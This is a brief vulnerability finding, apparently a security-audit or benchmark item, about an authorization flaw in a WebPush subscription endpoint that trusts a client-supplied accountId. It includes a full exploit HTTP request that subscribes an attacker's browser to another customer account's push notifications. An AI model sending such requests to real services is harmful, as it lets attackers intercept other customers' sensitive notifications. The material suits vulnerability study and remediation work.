diagnosis: The browser WebPush subscription registration endpoint extracts accountId from the request body without verifying that req.user is an authorized member of that account. An attacker can register their browser to receive sensitive web push notifications directed to other customer accounts.
exploit_request:
POST /api/webpush/subscribe HTTP/1.1
Host: notifications.webapp.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"accountId": "acc_enterprise_vip_100", "subscription": {"endpoint": "https://fcm.googleapis.com/fcm/send/attacker_sub", "keys": {"p256dh": "BNc...", "auth": "8z..."}}}
